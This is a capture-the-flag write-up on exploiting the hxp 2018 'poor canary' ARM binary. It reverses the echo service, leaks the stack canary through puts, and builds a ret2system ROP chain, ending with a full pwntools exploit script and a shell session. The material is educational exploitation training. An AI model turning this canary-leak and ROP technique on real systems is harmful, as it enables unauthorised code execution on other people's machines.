# Hxp 2018 poor canary

Let's take a look at the binary:

```
$    file canary
canary: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=3599326b9bf146191588a1e13fb3db905951de07, not stripped
$    pwn checksec canary
[*] '/Hackery/pod/modules/ret_2_system/hxp18_poorCanary/canary'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

So we can see that we are dealing with a `32` bit arm binary, that has a Stack Canary and NX stack. Arm is a different architecture from what we have been working with mostly, so things will be a bit different. Since we are dealing with arm binary, we will need qemu to run it (or some other emulator). In addition to that, if we want to use gdb we will need to install multi-architecture support for gdb. Lastly we will also need to install a utility for parsing through it's assembly code (we will use it later):

To emulate the binary:
```
$    sudo apt-get install qemu-user
```

For gdb support:
```
$    sudo apt-get install gdb-multiarch
```

For assembly code viewing:
```
$    sudo apt-get install binutils-arm-none-eabi
```

Now let's take a look at the binary:
```
$    qemu-arm canary
Welcome to hxp's Echo Service!
> 15935728
15935728
> 77777777777777777777777777777777777777777777777777777
77777777777777777777777777777777777777777777777777777
```

So we can see that it scan in data, and prints it back. Let's figure out exactly what it is doing.

## Reversing

When we take a look at the main function in Ghidra, we see this:

```
undefined4 main(void)

{
  ssize_t bytesRead;
  char input [41];
  int stackCanary;
  int canary;
 
  canary = __stack_chk_guard;
  setbuf((FILE *)stdout,(char *)0x0);
  setbuf((FILE *)stdin,(char *)0x0);
  puts("Welcome to hxp\'s Echo Service!");
  while( true ) {
    printf("> ");
    bytesRead = read(0,input + 1,0x60);
    if ((bytesRead < 1) || ((input[bytesRead] == '\n' && (input[bytesRead] = '\0', bytesRead == 1)))
       ) break;
    puts(input + 1);
  }
  if (canary == __stack_chk_guard) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

So we can see here that it starts off by printing the string `"Welcome to hxp\'s Echo Service!"`. Proceeding that it enters into a `while (true)` loop. Each iteration of the loop scans in `0x60` bytes worth of data into `input + 1`, which can only hold `40` bytes. So we have a buffer overflow. In addition to that it will print our input using `puts(input + 1)`.

## Exploitation

So to pop a shell, we will use the buffer overflow to overwrite the return address. However before we do that, we will need to deal with the stack canary.

#### Canary

We will leak the stack canary using the `puts(input + 1)` call. This is how it will work. The function `puts` will print data from a pointer that it is passed until it reaches a null byte. We will write just enough data to overwrite the least significant byte of the stack canary. This is because the least significant byte of the stack canary will be a null byte. Then when it prints our input, it will also print the rest of the stack canary (which will just be `3` bytes since we are dealing with a `32` bit binary) since there will be no null bytes in between the start of our input and the rest of the stack canary. Then we can just take those three bytes and add a null byte as the least significant byte, and we will have the stack canary.

#### Ret2System

So with that we will be able to overwrite the return address and get code execution. The only question is what will we execute with it. We can see that system is imported into the binary at `0x16d90`, so that is a good candidate:

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             int __stdcall system(char * __command)
             int               r0:4           <RETURN>
             char *            r0:4           __command
                             __libc_system                                   XREF[1]:     Entry Point(*)  
                             system
        00016d90 00 00 50 e3     cmp        __command,#0x0
```

We can also see it using objdump:
```
$    arm-none-eabi-objdump -D canary | grep libc_system
00016d90 <__libc_system>:
   16d94:    0a000000     beq    16d9c <__libc_system+0xc>
```

Next we just need to prep the argument for the `system` function. In Ghidra we can see that the string `/bin/sh` is at `0x71eb0`:

```
                             s_/bin/sh_00071eb0                              XREF[1]:     do_system:00016d58(*)  
        00071eb0 2f 62 69        ds         "/bin/sh"
                 6e 2f 73
                 68 00
```

The next thing that we will need is a ROP gadget that will pop values into the `r0` and `pc` registers. The code will expect it's argument in `r0`, and it will expect `pc` to hold the address to be executed:

```
$    python ROPgadget.py --binary canary | grep pop | grep r0 | grep pc
```

Looking through the list, we find this one which works (although we will need 4 bytes of filler data for `r4`):

```
0x00026b7c : pop {r0, r4, pc}
```

There is just one last thing that we will need before we can write the exploit. We know that the offset between the start of our input and the stack canary is `40` bytes, but what is the offset between the stack canary and the return address? Looking at the stack layout of the `main` function, we see that the canary is stored at offset `-0x14`:

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         r0:1           <RETURN>                                XREF[1]:     00010530(W)  
             ssize_t           r0:4           bytesRead                               XREF[1]:     00010530(W)  
             int               Stack[-0x14]:4 stackCanary                             XREF[2]:     000104cc(W),
                                                                                                   00010578(R)  
             char[41]          Stack[-0x3d]   input
             int               HASH:3fd2270   canary
                             main                                            XREF[3]:     Entry Point(*),
                                                                                          _start:0001039c(*), 000103b0(*)  
        000104b8 30 40 2d e9     stmdb      sp!,{ r4 r5 lr }
```

Since the canary is `4` bytes, that means that the end of the canary will put us at `0x10`. In `32` bit arm, the return address is stored at the base of the stack (we can just do a quick google search to find this out). Since addresses in this architecture are just 4 bytes, that means that return address ranges from offsets `0-4`. So the offset between the stack canary and the return address is just `0x10 - 0x4 = 0xc` bytes.

So our exploit will contain the following:

```
*    40 bytes of filler data
*    4 bytes stack canary
*    12 bytes of filler data to return address
*    4 byte rop gadget pop {r0, r4, pc}
*    4 byte "/bin/sh" argument
*    4 byte filler
*    4 byte address of system
```

## Exploit

Putting it all together we have the following exploit:

```
# This exploit is based off of: https://ctftime.org/writeup/12568

from pwn import *

target = process(['qemu-arm', 'canary'])

system = p32(0x16d90)
binsh = p32(0x71eb0)

# pop {r0, r4, pc}
gadget = p32(0x26b7c)

def clearInput():
    print target.recvuntil('>')

def leakCanary():
    target.send("0"*41)
    print target.recvuntil('0'*41)
    leak = target.recv(3)
    canary = u32("\x00" + leak)
    print "Stack canary: " + hex(canary)
    return canary
clearInput()

canary = leakCanary()

payload = ""
payload += "0"*40
payload += p32(canary)
payload += "1"*12
payload += gadget
payload += binsh
payload += "2"*4
payload += system

target.sendline(payload)
target.sendline("")

target.interactive()
```

When we run it:

```
$    python exploit.py
[+] Starting local process '/usr/bin/qemu-arm': pid 20280
Welcome to hxp's Echo Service!
>
 00000000000000000000000000000000000000000
Stack canary: 0x2c7cd100
[*] Switching to interactive mode

> 0000000000000000000000000000000000000000
> $ w
 16:35:30 up  4:17,  1 user,  load average: 1.09, 1.18, 1.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               12:19   ?xdm?  26:12   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
$ ls
canary    exploit.py  readme.md  ROPgadget.py
```

Just like that, we popped a shell!